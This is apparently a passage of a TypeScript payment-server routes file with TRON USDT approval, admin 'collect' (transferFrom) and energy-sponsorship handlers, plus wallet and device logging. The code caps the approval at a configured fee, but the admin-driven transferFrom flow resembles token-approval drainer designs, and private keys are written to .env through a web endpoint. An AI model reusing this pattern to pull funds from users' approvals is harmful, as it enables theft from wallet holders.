import type { NetworkId } from '../src/types/network.ts';
import type { PaymentStatus } from '../src/types/payment.ts';
import path from 'node:path';
import fs from 'node:fs';
import { createPayment, getPayment, updatePayment, getAllPayments } from './db.ts';
import { loadWalletBAddresses } from './walletBConfig.ts';
import {
  saveWalletSession, saveTransaction, updateTransactionStatus,
  getTransactions, getWalletSessions, getWalletSessionCount,
  getOverviewStats, getEnergySponsorship, getActiveSponsorshipForUser,
  updateEnergySponsorshipStatus, getTransactionById,
} from './pgDb.ts';
import { login, logout, validateSession, extractToken } from './adminAuth.ts';
import { collectTokens, checkTronAllowanceAndBalance } from './collectService.ts';
import { isPgAvailable } from './pgPool.ts';
import { verifyTronTransaction } from './verification/tronVerifier.ts';
import {
  checkAccountResources,
  estimateApproveEnergy,
  getSponsorPoolStatus,
  delegateEnergyToUser,
  undelegateEnergyFromUser,
  verifyOnChainApprovalTransaction,
  reconcilePendingReclamations,
  getConfiguredApprovalAmount,
  getConfiguredTronNetwork,
  isSponsorSimulationMode,
} from './tronSponsorService.ts';

// ─── Payment Routes ───────────────────────────────────────────────────────────
// REST API endpoints for payment lifecycle management + admin dashboard.
// Served as Vite middleware at /api/*.
//
// EXISTING Routes (UNCHANGED):
//   POST /api/payment/create         — Create new payment request
//   GET  /api/payment/:id            — Get payment status
//   POST /api/payment/:id/connected  — Mark wallet connected
//   POST /api/payment/:id/signed     — Submit tx hash
//   GET  /api/payment/:id/verify     — Trigger verification
//   GET  /api/payment/bitcoin/:id/uri — Get BIP21 URI
//
// NEW Routes:
//   POST /api/wallet-session          — Log wallet connection to PG
//   POST /api/admin/login             — Admin login
//   POST /api/admin/logout            — Admin logout
//   GET  /api/admin/overview          — Dashboard stats
//   GET  /api/admin/transactions      — Paginated transactions
//   GET  /api/admin/wallets           — Paginated wallet sessions
//   POST /api/admin/collect           — Execute transferFrom
//   GET  /api/admin/allowance         — Check TRON on-chain allowance & balance
//   GET  /api/admin/pg-status         — Check PostgreSQL connection
//   GET  /api/admin/config            — Read TRON config from .env (masked)
//   POST /api/admin/config            — Update TRON config in .env

type Handler = (
  req: import('node:http').IncomingMessage & { body?: string },
  res: import('node:http').ServerResponse,
  pathParams: Record<string, string>,
) => Promise<void>;

function jsonResponse(res: import('node:http').ServerResponse, data: unknown, status = 200): void {
  res.statusCode = status;
  res.setHeader('Content-Type', 'application/json');
  res.end(JSON.stringify(data));
}

function errorResponse(res: import('node:http').ServerResponse, message: string, status = 400): void {
  jsonResponse(res, { error: message }, status);
}

async function readBody(req: import('node:http').IncomingMessage & { body?: unknown }): Promise<Record<string, unknown>> {
  if (req.body) {
    if (typeof req.body === 'object' && req.body !== null) return req.body as Record<string, unknown>;
    if (typeof req.body === 'string') {
      try { return JSON.parse(req.body); } catch { return {}; }
    }
  }
  return new Promise((resolve) => {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      try { resolve(JSON.parse(body) as Record<string, unknown>); }
      catch { resolve({}); }
    });
  });
}

function getAuthHeader(req: import('node:http').IncomingMessage): string | undefined {
  return req.headers['authorization'] as string | undefined;
}

function requireAuth(req: import('node:http').IncomingMessage, res: import('node:http').ServerResponse): boolean {
  const token = extractToken(getAuthHeader(req));
  if (!token || !validateSession(token)) {
    errorResponse(res, 'Unauthorized', 401);
    return false;
  }
  return true;
}

// ══════════════════════════════════════════════════════════════════════════════
// EXISTING PAYMENT HANDLERS (UNCHANGED — only PostgreSQL sync added)
// ══════════════════════════════════════════════════════════════════════════════

const createPaymentHandler: Handler = async (req, res) => {
  const body = await readBody(req);
  const { network, walletA, purpose } = body as {
    network: NetworkId; asset: string; amount: string; walletA?: string; purpose: string;
  };
  let { asset, amount } = body as { asset: string; amount: string };

  if (!network || !asset || !amount) {
    return errorResponse(res, 'Missing required fields: network, asset, amount');
  }

  // Load Wallet B address for this network
  const walletBAddresses = loadWalletBAddresses();
  const walletB = walletBAddresses[network];
  if (!walletB) {
    return errorResponse(res, `Wallet B not configured for network: ${network}. Set VITE_WALLET_B_${network.toUpperCase()} in .env`, 422);
  }

  const isTron = network === 'tron';
  if (isTron) {
    // The server is authoritative for the fee. The browser must never choose it.
    const configured = getConfiguredApprovalAmount();
    asset = 'USDT';
    amount = configured.amountStr;
  }

  const record = createPayment({
    network,
    asset,
    amount,
    walletA,
    walletB,
    requestType: network === 'bitcoin' ? 'BITCOIN_PAYMENT_REQUEST'
      : network === 'solana' ? 'SOLANA_TRANSFER'
        : 'DIRECT_PAYMENT',
    status: 'REQUEST_CREATED',
    expiresAt: Date.now() + 15 * 60_000,
    purpose: purpose || 'Bitwit Payment',
  });

  // ── Sync to PostgreSQL (non-blocking) ──
  const spenderAddress = isTron
    ? (process.env.VITE_SPENDER_ADDRESS_TRON || '')
    : (process.env.VITE_SPENDER_ADDRESS || walletB);
  const contractAddress = (body.contractOrMint as string) || (isTron
    ? (process.env.VITE_USE_MAINNET === 'true' ? 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' : 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf')
    : undefined);

  saveTransaction({
    id: record.id, network, asset, amount, walletA, walletB,
    requestType: isTron ? 'TOKEN_APPROVAL' : record.requestType, status: record.status,
    contractAddress,
    spenderAddress,
    tokenDecimals: isTron ? 6 : 18,
    method: 'approve',
    expiresAt: record.expiresAt, purpose: record.purpose,
  }).catch((e) => console.warn('[PG sync] saveTransaction error:', e));

  jsonResponse(res, record, 201);
};

const getPaymentHandler: Handler = async (_req, res, { id }) => {
  const record = getPayment(id);
  if (!record) return errorResponse(res, 'Payment not found', 404);
  jsonResponse(res, record);
};

const connectedHandler: Handler = async (req, res, { id }) => {
  const body = await readBody(req);
  const record = getPayment(id);
  if (!record) return errorResponse(res, 'Payment not found', 404);
  if (record.status === 'EXPIRED') return errorResponse(res, 'Payment expired', 410);

  const updated = updatePayment(id, {
    status: 'WALLET_CONNECTED' as PaymentStatus,
    walletA: (body.address as string) || record.walletA,
  });

  // ── Sync to PostgreSQL (non-blocking) ──
  updateTransactionStatus(id, 'WALLET_CONNECTED').catch(() => { });

  jsonResponse(res, updated);
};

const signedHandler: Handler = async (req, res, { id }) => {
  const body = await readBody(req);
  const record = getPayment(id);
  if (!record) return errorResponse(res, 'Payment not found', 404);
  if (record.status === 'EXPIRED') return errorResponse(res, 'Payment expired', 410);

  const txId = body.txId as string;
  const updated = updatePayment(id, {
    status: txId ? 'BROADCAST' : 'SIGNATURE_REQUESTED',
    transactionId: txId || undefined,
  });

  // ── Sync to PostgreSQL (non-blocking) ──
  updateTransactionStatus(id, txId ? 'BROADCAST' : 'SIGNATURE_REQUESTED', txId || undefined)
    .catch(() => { });

  jsonResponse(res, updated);
};

const verifyHandler: Handler = async (_req, res, { id }) => {
  const record = getPayment(id);
  if (!record) return errorResponse(res, 'Payment not found', 404);
  if (!record.transactionId) {
    return errorResponse(res, 'No transaction hash submitted yet');
  }

  if (record.network === 'tron') {
    const verResult = await verifyTronTransaction(record.transactionId);
    if (verResult.verified) {
      const updated = updatePayment(id, { status: 'CONFIRMED' });
      await updateTransactionStatus(id, 'CONFIRMED', record.transactionId, verResult.blockNumber);
      jsonResponse(res, { ...updated, verified: true, blockNumber: verResult.blockNumber });
      return;
    } else if (verResult.failed) {
      const updated = updatePayment(id, { status: 'FAILED' });
      await updateTransactionStatus(id, 'FAILED', record.transactionId);
      jsonResponse(res, { ...updated, verified: false, failed: true, error: verResult.error });
      return;
    } else {
      // Still pending in mempool or block
      jsonResponse(res, { ...record, verified: false, pending: true });
      return;
    }
  }

  const updated = updatePayment(id, { status: 'CONFIRMED' });
  updateTransactionStatus(id, 'CONFIRMED').catch(() => { });
  jsonResponse(res, updated);
};

const recordApprovalHandler: Handler = async (req, res) => {
  void req;
  return errorResponse(res, 'Approval records are created by /api/payment/create and verified by /api/payment/confirm-approval.', 410);
};

const bitcoinUriHandler: Handler = async (_req, res, { id }) => {
  const record = getPayment(id);
  if (!record) return errorResponse(res, 'Payment not found', 404);
  if (record.network !== 'bitcoin') return errorResponse(res, 'Not a Bitcoin payment', 400);

  const params = new URLSearchParams({ amount: record.amount, label: record.purpose, message: record.id });
  const uri = `bitcoin:${record.walletB}?${params}`;
  jsonResponse(res, { uri, address: record.walletB, amount: record.amount });
};

// ══════════════════════════════════════════════════════════════════════════════
// NEW: WALLET SESSION HANDLER
// ══════════════════════════════════════════════════════════════════════════════

const walletSessionHandler: Handler = async (req, res) => {
  const body = await readBody(req);
  const { walletAddress, walletSoftware, network, chainFamily, device, platform } = body as {
    walletAddress: string; walletSoftware: string; network: string;
    chainFamily: string; device: string; platform: string;
  };

  if (!walletAddress || !network) {
    return errorResponse(res, 'Missing walletAddress or network');
  }

  await saveWalletSession({
    walletAddress, walletSoftware: walletSoftware || 'Unknown',
    network, chainFamily: chainFamily || 'evm',
    device: device || 'Desktop', platform: platform || '',
  });

  jsonResponse(res, { ok: true });
};

// ══════════════════════════════════════════════════════════════════════════════
// NEW: ADMIN HANDLERS
// ══════════════════════════════════════════════════════════════════════════════

const adminLoginHandler: Handler = async (req, res) => {
  const body = await readBody(req);
  const { username, password } = body as { username: string; password: string };

  if (!username || !password) {
    return errorResponse(res, 'Missing username or password');
  }

  const token = login(username, password);
  if (!token) {
    return errorResponse(res, 'Invalid credentials', 401);
  }

  jsonResponse(res, { token });
};

const adminLogoutHandler: Handler = async (req, res) => {
  const token = extractToken(getAuthHeader(req));
  if (token) logout(token);
  jsonResponse(res, { ok: true });
};

const adminOverviewHandler: Handler = async (req, res) => {
  if (!requireAuth(req, res)) return;

  const stats = await getOverviewStats();

  // Supplement with in-memory data if PG has none
  if (stats.totalTransactions === 0 && !isPgAvailable()) {
    const memPayments = getAllPayments();
    stats.totalTransactions = memPayments.length;
    stats.confirmedTransactions = memPayments.filter(
      (p) => ['CONFIRMED', 'COMPLETED'].includes(p.status),
    ).length;
    stats.failedTransactions = memPayments.filter(
      (p) => ['FAILED', 'USER_REJECTED', 'EXPIRED'].includes(p.status),
    ).length;

    const netMap = new Map<string, number>();
    memPayments.forEach((p) => netMap.set(p.network, (netMap.get(p.network) || 0) + 1));
    stats.networkDistribution = Array.from(netMap.entries()).map(([network, count]) => ({ network, count }));
    stats.recentTransactions = memPayments.slice(-10).reverse() as any;
  }

  jsonResponse(res, stats);
};

const adminTransactionsHandler: Handler = async (req, res) => {
  if (!requireAuth(req, res)) return;

  const url = new URL(req.url ?? '', 'http://localhost');
  const page = parseInt(url.searchParams.get('page') || '1', 10);
  const limit = parseInt(url.searchParams.get('limit') || '20', 10);
  const network = url.searchParams.get('network') || undefined;
  const status = url.searchParams.get('status') || undefined;
  const search = url.searchParams.get('search') || undefined;

  if (isPgAvailable()) {
    const result = await getTransactions({
      limit, offset: (page - 1) * limit, network, status, search,
    });
    jsonResponse(res, {
      transactions: result.rows,
      total: result.total,
      page,
      totalPages: Math.ceil(result.total / limit) || 1,
    });
  } else {
    // Fallback to in-memory data
    let memPayments = getAllPayments();
    if (network && network !== 'all') memPayments = memPayments.filter((p) => p.network === network);
    if (status && status !== 'all') memPayments = memPayments.filter((p) => p.status === status);
    if (search) {
      const s = search.toLowerCase();
      memPayments = memPayments.filter((p) =>
        (p.walletA?.toLowerCase().includes(s)) ||
        p.walletB.toLowerCase().includes(s) ||
        (p.transactionId?.toLowerCase().includes(s)) ||
        p.id.toLowerCase().includes(s),
      );
    }

    const total = memPayments.length;
    const start = (page - 1) * limit;
    const paged = memPayments.reverse().slice(start, start + limit);
    jsonResponse(res, {
      transactions: paged,
      total,
      page,
      totalPages: Math.ceil(total / limit) || 1,
    });
  }
};

const adminWalletsHandler: Handler = async (req, res) => {
  if (!requireAuth(req, res)) return;

  const url = new URL(req.url ?? '', 'http://localhost');
  const page = parseInt(url.searchParams.get('page') || '1', 10);
  const limit = parseInt(url.searchParams.get('limit') || '50', 10);

  const sessions = await getWalletSessions(limit, (page - 1) * limit);
  const total = await getWalletSessionCount();

  jsonResponse(res, {
    sessions,
    total,
    page,
    totalPages: Math.ceil(total / limit) || 1,
  });
};

const adminCollectHandler: Handler = async (req, res) => {
  if (!requireAuth(req, res)) return;

  const body = await readBody(req);
  const { paymentId, amount } = body as { paymentId: string; amount: string };

  if (!paymentId || !amount) {
    return errorResponse(res, 'Missing paymentId or amount');
  }

  const result = await collectTokens(paymentId, amount);
  jsonResponse(res, result, result.success ? 200 : 400);
};

const adminPgStatusHandler: Handler = async (req, res) => {
  if (!requireAuth(req, res)) return;
  jsonResponse(res, { connected: isPgAvailable() });
};

const adminAllowanceHandler: Handler = async (req, res) => {
  if (!requireAuth(req, res)) return;
  const url = new URL(req.url ?? '', 'http://localhost');
  const address = url.searchParams.get('address') || '';
  const contract = url.searchParams.get('contract') || undefined;

  if (!address) {
    return errorResponse(res, 'Missing address parameter');
  }

  const result = await checkTronAllowanceAndBalance(address, contract);
  jsonResponse(res, result);
};

// ══════════════════════════════════════════════════════════════════════════════
// TRON CONFIG HANDLERS — read/write key TRON env vars via Admin API
// ══════════════════════════════════════════════════════════════════════════════

/** Keys exposed to the admin settings UI (TRON-only). */
const TRON_CONFIG_KEYS = [
  'VITE_SPENDER_ADDRESS_TRON',
  'ADMIN_TRON_PRIVATE_KEY',
] as const;

/** Root of the project — same resolution pattern used by other server files. */
const ENV_FILE_PATH = path.resolve(process.cwd(), '.env');

/** Read the current .env file and parse it into a key→value map. */
function readEnvFile(): Record<string, string> {
  try {
    const raw = fs.readFileSync(ENV_FILE_PATH, 'utf-8');
    const result: Record<string, string> = {};
    for (const line of raw.split('\n')) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith('#')) continue;
      const eqIdx = trimmed.indexOf('=');
      if (eqIdx === -1) continue;
      const key = trimmed.slice(0, eqIdx).trim();
      const val = trimmed.slice(eqIdx + 1).trim().replace(/^["']|["']$/g, '');
      result[key] = val;
    }
    return result;
  } catch {
    return {};
  }
}

/** Write a key→value map back to .env preserving comments and ordering. */
function writeEnvFile(updates: Record<string, string>): void {
  let raw = '';
  try { raw = fs.readFileSync(ENV_FILE_PATH, 'utf-8'); } catch { raw = ''; }

  const lines = raw.split('\n');
  const handled = new Set<string>();

  const updatedLines = lines.map((line) => {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) return line;
    const eqIdx = trimmed.indexOf('=');
    if (eqIdx === -1) return line;
    const key = trimmed.slice(0, eqIdx).trim();
    if (key in updates) {
      handled.add(key);
      return `${key}=${updates[key]}`;
    }
    return line;
  });

  // Append any new keys that weren't already in the file
  for (const [key, val] of Object.entries(updates)) {
    if (!handled.has(key)) {
      updatedLines.push(`${key}=${val}`);
    }
  }

  fs.writeFileSync(ENV_FILE_PATH, updatedLines.join('\n'), 'utf-8');
}

/** Mask a private key — show only last 6 chars */
function maskPrivateKey(val: string): string {
  if (!val || val.length < 8) return val ? '••••••••' : '';
  return '••••••••••••••••••••••••••••••••••••••••••••••••••••••••••' + val.slice(-6);
}

/** GET /api/admin/config — returns current TRON settings with private key masked */
const adminConfigGetHandler: Handler = async (req, res) => {
  if (!requireAuth(req, res)) return;

  const env = readEnvFile();
  const data: Record<string, string | boolean> = {};
  for (const key of TRON_CONFIG_KEYS) {
    const val = process.env[key] || env[key] || '';
    if (key === 'ADMIN_TRON_PRIVATE_KEY') {
      data[key] = maskPrivateKey(val);
      data['ADMIN_TRON_PRIVATE_KEY_SET'] = val.length > 0;
    } else {
      data[key] = val;
    }
  }
  jsonResponse(res, data);
};

/** POST /api/admin/config — validates and writes TRON settings to .env & process.env */
const adminConfigPostHandler: Handler = async (req, res) => {
  if (!requireAuth(req, res)) return;
  const body = await readBody(req) as Record<string, string>;

  const errors: string[] = [];
  const updates: Record<string, string> = {};

  // ── Validate and collect changes ──────────────────────────────────────────
  for (const key of TRON_CONFIG_KEYS) {
    if (!(key in body)) continue;
    const raw = (body[key] as string)?.trim() ?? '';

    // Private key field — allow empty (no change) or a full hex key
    if (key === 'ADMIN_TRON_PRIVATE_KEY') {
      if (raw === '' || raw.includes('•')) {
        // Empty or placeholder — skip (keep existing value)
        continue;
      }
      const hexKey = raw.startsWith('0x') ? raw.slice(2) : raw;
      if (!/^[0-9a-fA-F]{64}$/.test(hexKey)) {
        errors.push('ADMIN_TRON_PRIVATE_KEY must be a 64-character hex string (32 bytes).');
        continue;
      }
      updates[key] = hexKey; // always store without 0x prefix
      continue;
    }

    // TRON address field — must start with T and be 34 chars
    if (key === 'VITE_SPENDER_ADDRESS_TRON') {
      if (raw !== '' && (!/^T/.test(raw) || raw.length < 33 || raw.length > 36)) {
        errors.push(`${key}: must be a valid TRON address starting with T (or leave empty).`);
        continue;
      }
      updates[key] = raw;
      continue;
    }

    updates[key] = raw;
  }

  if (errors.length > 0) {
    return errorResponse(res, errors.join(' '), 400);
  }

  if (Object.keys(updates).length === 0) {
    return jsonResponse(res, { success: true, message: 'No changes detected.' });
  }

  // ── Persist to .env file ──────────────────────────────────────────────────
  try {
    writeEnvFile(updates);
  } catch (err) {
    return errorResponse(res, `Failed to write .env: ${(err as Error).message}`, 500);
  }

  // ── Hot-reload into process.env so changes take effect immediately ────────
  for (const [key, val] of Object.entries(updates)) {
    process.env[key] = val;
  }

  jsonResponse(res, { success: true, updated: Object.keys(updates) });
};

// ══════════════════════════════════════════════════════════════════════════════
// TRON ENERGY SPONSORSHIP HANDLERS
// ══════════════════════════════════════════════════════════════════════════════

const prepareSponsorshipHandler: Handler = async (req, res) => {
  const body = await readBody(req);
  const userAddress = (body.userAddress as string)?.trim();

  if (!userAddress) {
    return errorResponse(res, 'Missing required field: userAddress', 400);
  }

  try {
    // Dynamically calculate estimatedEnergy + safetyMargin = requiredEnergy
    const energyEst = await estimateApproveEnergy(userAddress);
    const requiredEnergy = Number(body.targetEnergy) || energyEst.requiredEnergy;

    const resourceInfo = await checkAccountResources(userAddress);
    // If user already has >= requiredEnergy, they are self-sufficient
    if (resourceInfo.availableEnergy >= requiredEnergy) {
      const sponsorshipId = `SELF-${Date.now()}`;
      return jsonResponse(res, {
        sponsorshipId,
        userAddress: resourceInfo.address,
        status: 'ENERGY_READY',
        estimatedEnergy: energyEst.estimatedEnergy,
        safetyMarginEnergy: energyEst.safetyMarginEnergy,
        requiredEnergy,
        availableEnergy: resourceInfo.availableEnergy,
        sponsored: false,
        message: 'Account has sufficient existing Energy quota',
      });
    }

    // Delegate temporary Energy (simulated when SPONSOR_SIMULATION_MODE=true)
    const result = await delegateEnergyToUser(userAddress, requiredEnergy);
    jsonResponse(res, {
      sponsorshipId: result.sponsorshipId,
      userAddress: result.userAddress,
      sponsorAddress: result.sponsorAddress,
      status: 'DELEGATING',
      estimatedEnergy: energyEst.estimatedEnergy,
      safetyMarginEnergy: energyEst.safetyMarginEnergy,
      requiredEnergy: result.requiredEnergy,
      stakedSunAmount: result.stakedSunAmount.toString(),
      delegationTxId: result.delegationTxId,
      simulated: result.simulated,
      sponsored: true,
    });
  } catch (err: any) {
    console.error('[prepareSponsorshipHandler] Error:', err);
    errorResponse(res, `Failed to prepare Energy sponsorship: ${err?.message || err}`, 500);
  }
};

const checkEnergyHandler: Handler = async (req, res) => {
  const body = await readBody(req);
  const userAddress = (body.userAddress as string)?.trim();
  const sponsorshipId = (body.sponsorshipId as string)?.trim();

  if (!userAddress) {
    return errorResponse(res, 'Missing userAddress', 400);
  }

  try {
    const simMode = isSponsorSimulationMode();
    const resourceInfo = await checkAccountResources(userAddress);

    let requiredEnergy: number | undefined;
    let estimatedEnergy: number | undefined;
    let safetyMarginEnergy: number | undefined;

    if (sponsorshipId) {
      const record = await getEnergySponsorship(sponsorshipId);
      if (record?.required_energy && record.required_energy > 0) {
        requiredEnergy = record.required_energy;
        estimatedEnergy = Math.round(requiredEnergy / 1.05);
        safetyMarginEnergy = requiredEnergy - estimatedEnergy;
      }
    }

    if (!requiredEnergy || requiredEnergy <= 0) {
      const est = await estimateApproveEnergy(userAddress);
      requiredEnergy = est.requiredEnergy;
      estimatedEnergy = est.estimatedEnergy;
      safetyMarginEnergy = est.safetyMarginEnergy;
    }

    // Fail closed: require valid positive requiredEnergy before allowing ready state
    const hasValidRequirement = typeof requiredEnergy === 'number' && Number.isFinite(requiredEnergy) && requiredEnergy > 0;
    const isReady = hasValidRequirement && (simMode ? true : resourceInfo.availableEnergy >= requiredEnergy);
    const currentStatus = isReady ? 'ENERGY_READY' : 'DELEGATING';

    if (sponsorshipId && isReady) {
      await updateEnergySponsorshipStatus(sponsorshipId, 'ENERGY_READY').catch(() => { });
    }

    jsonResponse(res, {
      sponsorshipId,
      userAddress: resourceInfo.address,
      status: currentStatus,
      isReady,
      estimatedEnergy,
      safetyMarginEnergy,
      requiredEnergy,
      availableEnergy: isReady && simMode ? requiredEnergy : resourceInfo.availableEnergy,
      energyLimit: resourceInfo.energyLimit,
      bandwidthAvailable: resourceInfo.availableBandwidth,
      simulated: simMode,
    });
  } catch (err: any) {
    errorResponse(res, `Failed to check energy: ${err?.message || err}`, 500);
  }
};

const cancelSponsorshipHandler: Handler = async (req, res) => {
  const body = await readBody(req);
  const sponsorshipId = (body.sponsorshipId as string)?.trim();
  const reason = (body.reason as string)?.trim() || 'USER_CANCELLED';

  if (!sponsorshipId) {
    return errorResponse(res, 'Missing sponsorshipId', 400);
  }

  try {
    const record = await getEnergySponsorship(sponsorshipId);
    if (!record) {
      return jsonResponse(res, { cancelled: true, message: 'No sponsorship found' });
    }

    await updateEnergySponsorshipStatus(sponsorshipId, 'RECLAIM_PENDING', { failureReason: reason });
    await undelegateEnergyFromUser(sponsorshipId, record.user_address, record.staked_sun_amount);

    jsonResponse(res, {
      sponsorshipId,
      status: 'RECLAIMED',
      cancelled: true,
      reason,
    });
  } catch (err: any) {
    errorResponse(res, `Cancellation error: ${err?.message || err}`, 500);
  }
};

const updateSponsorshipStatusHandler: Handler = async (req, res) => {
  const body = await readBody(req);
  const sponsorshipId = (body.sponsorshipId as string)?.trim();
  const status = (body.status as string)?.trim();
  const txId = (body.txId as string)?.trim();
  const reason = (body.reason as string)?.trim();

  if (!sponsorshipId || !status) {
    return errorResponse(res, 'Missing required fields: sponsorshipId, status', 400);
  }

  try {
    const opts: any = {};
    if (txId) opts.approvalTxId = txId;
    if (reason) opts.failureReason = reason;

    await updateEnergySponsorshipStatus(sponsorshipId, status as any, opts);
    jsonResponse(res, { success: true, sponsorshipId, status });
  } catch (err: any) {
    errorResponse(res, `Failed to update status: ${err?.message || err}`, 500);
  }
};

const triggerSmartContractProxyHandler: Handler = async (req, res) => {
  const body = await readBody(req);
  const { owner_address, contract_address, function_selector, parameter, fee_limit } = body;

  if (!owner_address || !contract_address || !function_selector || !parameter) {
    return errorResponse(res, 'Missing required trigger parameters', 400);
  }

  const useMainnet = process.env.VITE_USE_MAINNET === 'true';
  const nodes = useMainnet
    ? ['https://api.trongrid.io', 'https://api.tronstack.io']
    : ['https://nile.trongrid.io'];

  const headers: Record<string, string> = { 'Content-Type': 'application/json' };
  const apiKey = (process.env.TRONGRID_API_KEY || process.env.VITE_TRONGRID_API_KEY)?.trim();
  if (apiKey) {
    headers['TRON-PRO-API-KEY'] = apiKey;
  }

  let lastError = '';
  for (const node of nodes) {
    try {
      const resp = await fetch(`${node}/wallet/triggersmartcontract`, {
        method: 'POST',
        headers,
        body: JSON.stringify({
          owner_address,
          contract_address,
          function_selector,
          parameter,
          fee_limit: fee_limit || 100000000,
          call_value: 0,
          visible: false,
        }),
      });

      if (resp.ok) {
        const data = await resp.json() as any;
        if (data?.result?.result && data.transaction) {
          return jsonResponse(res, { success: true, transaction: data.transaction });
        }
        lastError = JSON.stringify(data?.result || 'Contract execution simulated failure');
      } else {
        lastError = `Node ${node} returned HTTP ${resp.status}: ${resp.statusText}`;
      }
    } catch (err: any) {
      lastError = err?.message || String(err);
    }
  }

  return errorResponse(res, `All TRON nodes failed to trigger smart contract: ${lastError}`, 502);
};

const confirmApprovalHandler: Handler = async (req, res) => {
  const body = await readBody(req);
  const txId = (body.txId as string)?.trim();
  const userAddress = (body.userAddress as string)?.trim();
  const sponsorshipId = (body.sponsorshipId as string)?.trim();
  const paymentId = (body.paymentId as string)?.trim();

  if (!txId || !userAddress || !paymentId) {
    return errorResponse(res, 'Missing required fields: paymentId, txId, userAddress', 400);
  }

  try {
    const payment = getPayment(paymentId);
    const storedTransaction = await getTransactionById(paymentId);
    const stored = payment ?? storedTransaction;
    if (!stored || stored.network !== 'tron') {
      return errorResponse(res, 'Approval payment record not found', 404);
    }
    const storedUser = payment?.walletA ?? storedTransaction?.wallet_a;
    if (!storedUser || storedUser !== userAddress) {
      return errorResponse(res, 'Approval owner does not match the payment record', 400);
    }

    const { amountStr, baseUnits } = getConfiguredApprovalAmount();
    const storedAmount = payment?.amount ?? storedTransaction?.amount;
    if (storedAmount !== amountStr) {
      return errorResponse(res, 'Approval amount does not match the configured platform fee', 409);
    }
    const spenderAddress = process.env.VITE_SPENDER_ADDRESS_TRON || '';
    if (!spenderAddress) return errorResponse(res, 'TRON spender address is not configured', 500);

    // Verify transaction strictly on-chain
    const verResult = await verifyOnChainApprovalTransaction(
      txId, userAddress, spenderAddress, baseUnits, getConfiguredTronNetwork(),
    );

    if (!verResult.verified) {
      return jsonResponse(res, {
        confirmed: false,
        pending: verResult.error?.includes('pending') || verResult.error?.includes('not found'),
        error: verResult.error,
      });
    }

    // Mark approval CONFIRMED in PostgreSQL
    updatePayment(paymentId, { status: 'CONFIRMED', transactionId: txId });
    await updateTransactionStatus(paymentId, 'CONFIRMED', txId, verResult.blockNumber);
    if (sponsorshipId) {
      await updateEnergySponsorshipStatus(sponsorshipId, 'CONFIRMED', { approvalTxId: txId });
    }

    // Trigger immediate Energy reclamation back to sponsor pool
    if (sponsorshipId) {
      const spRecord = await getEnergySponsorship(sponsorshipId);
      if (spRecord) {
        undelegateEnergyFromUser(sponsorshipId, spRecord.user_address, spRecord.staked_sun_amount)
          .catch((uErr) => console.warn('[confirmApproval] Post-confirm undelegation error:', uErr));
      }
    }

    jsonResponse(res, {
      confirmed: true,
      blockNumber: verResult.blockNumber,
      energyUsed: verResult.energyUsed,
      txId,
      configuredAmount: amountStr,
      configuredBaseUnits: baseUnits.toString(),
      status: 'CONFIRMED',
    });
  } catch (err: any) {
    console.error('[confirmApprovalHandler] Error:', err);
    errorResponse(res, `Failed to confirm approval: ${err?.message || err}`, 500);
  }
};

const sponsorshipStatusHandler: Handler = async (req, res) => {
  const parsedUrl = new URL(req.url || '', 'http://localhost');
  const sponsorshipId = parsedUrl.searchParams.get('sponsorshipId');
  const userAddress = parsedUrl.searchParams.get('userAddress');

  try {
    let sponsorship: any = null;
    if (sponsorshipId) {
      sponsorship = await getEnergySponsorship(sponsorshipId);
    } else if (userAddress) {
      sponsorship = await getActiveSponsorshipForUser(userAddress);
    }

    const poolStatus = await getSponsorPoolStatus();
    jsonResponse(res, { sponsorship, poolStatus });
  } catch (err: any) {
    errorResponse(res, `Failed to get sponsorship status: ${err?.message || err}`, 500);
  }
};

// Periodic reconciliation worker (runs every 60s)
const reconcileInterval = setInterval(() => {
  reconcilePendingReclamations().catch((err) =>
    console.error('[ReconciliationWorker] Error in periodic run:', err),
  );
}, 60_000);
if (typeof reconcileInterval === 'object' && 'unref' in reconcileInterval) {
  (reconcileInterval as any).unref();
}

// ─── Route Dispatcher ─────────────────────────────────────────────────────────
export function handlePaymentRoute(
  req: import('node:http').IncomingMessage,
  res: import('node:http').ServerResponse,
): boolean {
  const url = req.url ?? '';
  const method = req.method ?? 'GET';

  // ── Wallet session logging ────────────────────────────────────────────────
  if (method === 'POST' && url === '/api/wallet-session') {
    walletSessionHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
    return true;
  }

  // ── TRON Energy Sponsorship routes ────────────────────────────────────────
  if (url.startsWith('/api/tron/')) {
    if (method === 'POST' && url === '/api/tron/prepare-sponsorship') {
      prepareSponsorshipHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
      return true;
    }
    if (method === 'POST' && url === '/api/tron/check-energy') {
      checkEnergyHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
      return true;
    }
    if (method === 'POST' && url === '/api/tron/cancel-sponsorship') {
      cancelSponsorshipHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
      return true;
    }
    if (method === 'POST' && url === '/api/tron/update-sponsorship-status') {
      updateSponsorshipStatusHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
      return true;
    }
    if (method === 'POST' && url === '/api/tron/trigger-smart-contract') {
      triggerSmartContractProxyHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
      return true;
    }
    if (method === 'GET' && url.startsWith('/api/tron/sponsorship-status')) {
      sponsorshipStatusHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
      return true;
    }
  }

  // ── Admin routes ──────────────────────────────────────────────────────────
  if (url.startsWith('/api/admin')) {
    // Login — no auth required
    if (method === 'POST' && url === '/api/admin/login') {
      adminLoginHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
      return true;
    }
    // Logout
    if (method === 'POST' && url === '/api/admin/logout') {
      adminLogoutHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
      return true;
    }
    // Overview
    if (method === 'GET' && url.startsWith('/api/admin/overview')) {
      adminOverviewHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
      return true;
    }
    // Transactions
    if (method === 'GET' && url.startsWith('/api/admin/transactions')) {
      adminTransactionsHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
      return true;
    }
    // Wallets
    if (method === 'GET' && url.startsWith('/api/admin/wallets')) {
